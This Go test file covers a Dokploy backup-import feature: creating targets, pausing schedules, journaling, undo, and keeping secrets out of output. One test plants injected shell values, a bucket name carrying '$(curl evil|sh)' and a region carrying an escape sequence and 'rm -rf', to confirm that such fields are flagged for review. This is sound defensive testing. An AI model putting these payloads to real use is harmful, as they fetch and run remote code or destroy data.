package main

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/GLINCKER/levelrail/internal/platformimport"
)

const fixtureSecret = "fixture-secret-r2"

// backupsDiscovery mirrors the destinations.json and project_backups.json fixtures: 2 destinations, 3 schedules.
func backupsDiscovery() *platformimport.Discovery {
	return &platformimport.Discovery{
		Destinations: []platformimport.BackupDestination{
			{SourceID: "dst-r2", Name: "Offsite R2", Provider: "Cloudflare", Endpoint: "https://acct.r2.cloudflarestorage.com", Region: "auto", Bucket: "shop-backups", HasCredentials: true},
			{SourceID: "dst-minio", Name: "minio", Provider: "Minio", Endpoint: "https://s3.example.com", Region: "eu-1", Bucket: "db-dumps"},
		},
		Databases: []platformimport.Database{
			{Name: "shop-db", Engine: "postgres", Backups: []platformimport.BackupSchedule{
				{Schedule: "0 3 * * *", Enabled: true, DestinationID: "dst-r2", KeepLatest: 7},
				{Schedule: "0 * * * *", Enabled: true, DestinationID: "dst-minio", KeepLatest: 24},
			}},
			{Name: "orders", Engine: "mysql", Backups: []platformimport.BackupSchedule{
				{Schedule: "30 2 * * 0", DestinationID: "dst-minio", KeepLatest: 4},
			}},
		},
	}
}

type fakeBackupAPI struct {
	mu        sync.Mutex
	existing  string
	byID      map[string]backupTargetResource
	dbSched   string
	dbTarget  string
	pauseFail bool
	clearFail bool
	cleared   int
	created   []createBackupTargetRequest
	schedules map[string]setBackupScheduleRequest
	paused    map[string]bool
}

func (f *fakeBackupAPI) handler(w http.ResponseWriter, r *http.Request) {
	f.mu.Lock()
	defer f.mu.Unlock()
	switch {
	case r.Method == http.MethodGet && r.URL.Path == "/api/v1/backup-targets":
		list := []backupTargetResource{}
		if f.existing != "" {
			list = append(list, backupTargetResource{ID: "bt-old", Name: f.existing})
		}
		_ = json.NewEncoder(w).Encode(list)
	case r.Method == http.MethodPost && r.URL.Path == "/api/v1/backup-targets":
		var req createBackupTargetRequest
		_ = json.NewDecoder(r.Body).Decode(&req)
		f.created = append(f.created, req)
		w.WriteHeader(http.StatusCreated)
		_ = json.NewEncoder(w).Encode(backupTargetResource{ID: "bt-new", Name: req.Name, Provider: req.Provider, Bucket: req.Bucket})
	case r.Method == http.MethodGet && strings.HasPrefix(r.URL.Path, "/api/v1/backup-targets/"):
		got, ok := f.byID[strings.TrimPrefix(r.URL.Path, "/api/v1/backup-targets/")]
		if !ok {
			w.WriteHeader(http.StatusNotFound)
			_, _ = io.WriteString(w, `{"error":"not found"}`)
			return
		}
		_ = json.NewEncoder(w).Encode(got)
	case r.Method == http.MethodGet && r.URL.Path == "/api/v1/databases/shop-db":
		_ = json.NewEncoder(w).Encode(databaseResource{Name: "shop-db", BackupSchedule: f.dbSched, BackupTargetID: f.dbTarget})
	case r.Method == http.MethodDelete && r.URL.Path == "/api/v1/databases/shop-db/backup-schedule":
		if f.clearFail {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = io.WriteString(w, `{"error":"boom"}`)
			return
		}
		f.cleared++
		w.WriteHeader(http.StatusNoContent)
	case r.Method == http.MethodPut && r.URL.Path == "/api/v1/databases/shop-db/backup-schedule":
		var req setBackupScheduleRequest
		_ = json.NewDecoder(r.Body).Decode(&req)
		f.schedules["shop-db"] = req
		_, _ = io.WriteString(w, `{}`)
	case r.Method == http.MethodPost && r.URL.Path == "/api/v1/databases/shop-db/backup-schedule/pause":
		if f.pauseFail {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = io.WriteString(w, `{"error":"boom"}`)
			return
		}
		f.paused["shop-db"] = true
		_, _ = io.WriteString(w, `{}`)
	default:
		w.WriteHeader(http.StatusNotFound)
		_, _ = io.WriteString(w, `{"error":"not found"}`)
	}
}

func newFakeBackupAPI(t *testing.T, api *fakeBackupAPI) *Client {
	t.Helper()
	if api.schedules == nil {
		api.schedules, api.paused = map[string]setBackupScheduleRequest{}, map[string]bool{}
	}
	srv := httptest.NewServer(http.HandlerFunc(api.handler))
	t.Cleanup(srv.Close)
	return NewClient(srv.URL, "tok")
}

func testJournal(t *testing.T, res ...journalResource) *applyJournal {
	t.Helper()
	now := time.Now().UTC().Format(time.RFC3339)
	return &applyJournal{path: filepath.Join(t.TempDir(), "j.json"), now: time.Now,
		j: &migrateJournal{Version: journalVersion, Source: "dokploy", StartedAt: now, UpdatedAt: now, Resources: res}}
}

func runBackupImportWith(t *testing.T, api *fakeBackupAPI, jr *applyJournal) *backupImport {
	t.Helper()
	client := newFakeBackupAPI(t, api)
	imp := planDokployBackups(backupsDiscovery(), backupPlanOptions{Limit: 50, CheckEndpoint: func(string) error { return nil }})
	imp.FinishPlan(true)
	imp.Creds = func(_ context.Context, id string) (string, string, error) {
		if id != "dst-r2" {
			return "", "", platformimport.ErrNoCredentials
		}
		return "fixture-access-r2", fixtureSecret, nil
	}
	applyBackupImport(context.Background(), client, imp, jr)
	return imp
}

func runBackupImport(t *testing.T, existing string) (*backupImport, *fakeBackupAPI) {
	t.Helper()
	api := &fakeBackupAPI{existing: existing}
	return runBackupImportWith(t, api, nil), api
}

func assertNoBackupSecret(t *testing.T, imp *backupImport) {
	t.Helper()
	raw, _ := json.Marshal(migrationReport{DokployURL: "https://dokploy.example.com", Backups: imp})
	var human bytes.Buffer
	printBackupImport(&human, imp)
	for _, out := range []string{string(raw), human.String()} {
		if strings.Contains(out, fixtureSecret) || strings.Contains(out, "fixture-access-r2") {
			t.Fatalf("a destination key leaked into output: %s", out)
		}
	}
}

func TestDokployBackupImportCreatesTargetAndPausedSchedule(t *testing.T) {
	imp, api := runBackupImport(t, "")
	if len(imp.Targets) != 2 || len(imp.Schedules) != 3 {
		t.Fatalf("plan: %+v", imp)
	}
	r2, minio := imp.Targets[0], imp.Targets[1]
	if r2.Name != "offsite-r2" || r2.Provider != "r2" || r2.State != backupCreated || r2.ID != "bt-new" {
		t.Fatalf("r2 target: %+v", r2)
	}
	if minio.State != backupNeedsSecret || minio.Provider != "custom" || !strings.Contains(minio.Detail, "<key>") {
		t.Fatalf("minio target: %+v", minio)
	}
	if len(api.created) != 1 || api.created[0].SecretAccessKey != fixtureSecret {
		t.Fatalf("create calls: %d", len(api.created))
	}
	nightly, hourly, weekly := imp.Schedules[0], imp.Schedules[1], imp.Schedules[2]
	if nightly.State != backupCreated || !nightly.Paused || api.schedules["shop-db"].Retain != 7 || api.schedules["shop-db"].TargetID != "bt-new" || !api.paused["shop-db"] {
		t.Fatalf("nightly: %+v %+v", nightly, api.schedules)
	}
	if hourly.State != backupSkipped || weekly.State != backupPending {
		t.Fatalf("hourly %+v weekly %+v", hourly, weekly)
	}
	assertNoBackupSecret(t, imp)
}

func TestDokployBackupImportNeverOverwritesExistingTarget(t *testing.T) {
	imp, api := runBackupImport(t, "offsite-r2")
	if imp.Targets[0].State != backupExists || len(api.created) != 0 || len(api.schedules) != 0 {
		t.Fatalf("collision: %+v created=%d schedules=%d", imp.Targets[0], len(api.created), len(api.schedules))
	}
	if imp.Schedules[0].State != backupPending {
		t.Fatalf("schedule on a skipped target: %+v", imp.Schedules[0])
	}
	assertNoBackupSecret(t, imp)
}

func TestDokployBackupPlanRejectsBadCronAndEndpoint(t *testing.T) {
	d := backupsDiscovery()
	d.Databases[1].Backups[0].Schedule = "not a cron"
	imp := planDokployBackups(d, backupPlanOptions{Limit: 50, CheckEndpoint: func(raw string) error {
		if strings.Contains(raw, "example.com") {
			return platformimport.ErrBlockedAddress
		}
		return nil
	}})
	if imp.Targets[1].State != backupReview || imp.Schedules[2].State != backupReview {
		t.Fatalf("plan: %+v", imp)
	}
}

func TestJournalAcceptsBackupKinds(t *testing.T) {
	now := time.Now().UTC().Format(time.RFC3339)
	j := &migrateJournal{Version: journalVersion, Source: "dokploy", StartedAt: now, UpdatedAt: now, Resources: []journalResource{
		{Kind: journalKindApp, Name: "shop-db", CreatedByRun: true, Steps: []journalStep{{Step: stepCreated, State: stateDone, At: now}}},
		{Kind: journalKindBackupTarget, Name: "offsite-r2", CreatedByRun: true, Steps: []journalStep{{Step: stepCreated, State: stateDone, At: now}}},
		{Kind: journalKindBackupSchedule, Name: "shop-db", CreatedByRun: true, Steps: []journalStep{{Step: stepCreated, State: stateDone, At: now}}},
	}}
	if err := validateJournal(j, "dokploy"); err != nil {
		t.Fatal(err)
	}
	j.Resources[1].Kind = "volume"
	if validateJournal(j, "dokploy") == nil {
		t.Fatal("unknown kind accepted")
	}
}

func TestDokployBackupPlanHostileFieldsGoToReview(t *testing.T) {
	d := backupsDiscovery()
	d.Destinations[0].Bucket = "x $(curl evil|sh)"
	d.Destinations[1].Region = "eu\x1b[31m\nrm -rf"
	d.Destinations = append(d.Destinations,
		platformimport.BackupDestination{SourceID: "s3", Name: "$$$", Bucket: "ok-bucket"},
		platformimport.BackupDestination{SourceID: "s4", Name: strings.Repeat("a", 80), Bucket: "ok-bucket"})
	imp := planDokployBackups(d, backupPlanOptions{Limit: 50})
	imp.FinishPlan(false)
	for i, tg := range imp.Targets {
		if tg.State != backupReview || strings.Contains(tg.Detail, "backup-targets create --name") {
			t.Fatalf("target %d: %+v", i, tg)
		}
	}
	var out bytes.Buffer
	printBackupImport(&out, imp)
	if strings.Contains(out.String(), "\x1b") || strings.Contains(out.String(), "\nrm") {
		t.Fatalf("control characters reached the output: %q", out.String())
	}
}

func TestDokployBackupHintIsShellQuoted(t *testing.T) {
	d := backupsDiscovery()
	d.Destinations[1].Region = "eu-'1"
	imp := planDokployBackups(d, backupPlanOptions{Limit: 50})
	imp.FinishPlan(false)
	hint := imp.Targets[1].Detail
	if !strings.Contains(hint, "--endpoint 'https://s3.example.com'") || !strings.Contains(hint, `--region 'eu-'\''1'`) || !strings.Contains(hint, "--bucket 'db-dumps'") {
		t.Fatalf("hint: %s", hint)
	}
	var out bytes.Buffer
	printBackupImport(&out, imp)
	if !strings.Contains(out.String(), backupEndpointWarning) {
		t.Fatal("endpoint warning missing")
	}
}

func TestDokployBackupJournalsIDAndFingerprint(t *testing.T) {
	jr := testJournal(t)
	runBackupImportWith(t, &fakeBackupAPI{}, jr)
	tg := jr.j.find(journalKindBackupTarget, "offsite-r2")
	sc := jr.j.find(journalKindBackupSchedule, "shop-db")
	if tg == nil || tg.TargetID != "bt-new" || !journalFingerprintRE.MatchString(tg.Fingerprint) || sc == nil || sc.TargetID != "bt-new" || sc.Cron != "0 3 * * *" {
		t.Fatalf("journal: %+v", jr.j.Resources)
	}
	if err := validateJournal(jr.j, "dokploy"); err != nil {
		t.Fatal(err)
	}
}

func TestDokployBackupResumeNeedsMatchingFingerprint(t *testing.T) {
	fp := backupTargetFingerprint("r2", "https://acct.r2.cloudflarestorage.com", "shop-backups", "auto")
	created := journalResource{Kind: journalKindBackupTarget, Name: "offsite-r2", CreatedByRun: true, TargetID: "bt-1", Fingerprint: fp}
	match := backupTargetResource{ID: "bt-1", Name: "offsite-r2", Provider: "r2", Endpoint: "https://acct.r2.cloudflarestorage.com", Bucket: "shop-backups", Region: "auto"}
	api := &fakeBackupAPI{byID: map[string]backupTargetResource{"bt-1": match}}
	imp := runBackupImportWith(t, api, testJournal(t, created))
	if imp.Targets[0].State != backupCreated || imp.Targets[0].ID != "bt-1" || len(api.created) != 0 {
		t.Fatalf("resume reuse: %+v created=%d", imp.Targets[0], len(api.created))
	}
	hidden := &fakeBackupAPI{byID: map[string]backupTargetResource{}}
	imp = runBackupImportWith(t, hidden, testJournal(t, created))
	if imp.Targets[0].State != backupReview || len(hidden.created) != 0 {
		t.Fatalf("hidden target must not be re-created: %+v", imp.Targets[0])
	}
}

func TestDokployBackupPauseAndClearFailureStaysJournaled(t *testing.T) {
	jr := testJournal(t)
	api := &fakeBackupAPI{pauseFail: true, clearFail: true}
	imp := runBackupImportWith(t, api, jr)
	if imp.Schedules[0].State != backupFailed || !strings.Contains(imp.Schedules[0].Detail, "may still be running") {
		t.Fatalf("schedule: %+v", imp.Schedules[0])
	}
	r := jr.j.find(journalKindBackupSchedule, "shop-db")
	if r == nil || !r.CreatedByRun || r.state(stepPaused) != stateFailed || validateJournal(jr.j, "dokploy") != nil {
		t.Fatalf("journal: %+v", r)
	}
	api2 := &fakeBackupAPI{pauseFail: true}
	jr2 := testJournal(t)
	imp = runBackupImportWith(t, api2, jr2)
	if api2.cleared != 1 || strings.Contains(imp.Schedules[0].Detail, "may still be running") || jr2.j.find(journalKindBackupSchedule, "shop-db").CreatedByRun {
		t.Fatalf("cleared schedule: %+v", imp.Schedules[0])
	}
}

func TestDokployBackupUndoRequiresRecordedIdentity(t *testing.T) {
	fp := backupTargetFingerprint("r2", "", "b-1", "")
	api := &fakeBackupAPI{byID: map[string]backupTargetResource{"bt-1": {ID: "bt-1", Provider: "r2", Bucket: "b-1"}}, dbSched: "0 3 * * *", dbTarget: "bt-1"}
	client := newFakeBackupAPI(t, api)
	ctx := context.Background()
	cases := []struct {
		r    journalResource
		want string
	}{
		{journalResource{Kind: journalKindBackupTarget, Name: "t", TargetID: "bt-1", Fingerprint: fp}, undoRemove},
		{journalResource{Kind: journalKindBackupTarget, Name: "t"}, undoSkip},
		{journalResource{Kind: journalKindBackupTarget, Name: "t", TargetID: "bt-1", Fingerprint: backupTargetFingerprint("aws", "", "other", "")}, undoSkip},
		{journalResource{Kind: journalKindBackupTarget, Name: "t", TargetID: "bt-gone", Fingerprint: fp}, undoSkip},
		{journalResource{Kind: journalKindBackupSchedule, Name: "shop-db", TargetID: "bt-1", Cron: "0 3 * * *"}, undoRemove},
		{journalResource{Kind: journalKindBackupSchedule, Name: "shop-db", TargetID: "bt-1", Cron: "0 4 * * *"}, undoSkip},
		{journalResource{Kind: journalKindBackupSchedule, Name: "orders", TargetID: "bt-1", Cron: "0 3 * * *"}, undoSkip},
	}
	for i, c := range cases {
		got, reason := planBackupUndo(ctx, client, &c.r)
		if got != c.want || strings.Contains(reason, "already gone") {
			t.Errorf("case %d: %s (%s)", i, got, reason)
		}
	}
}
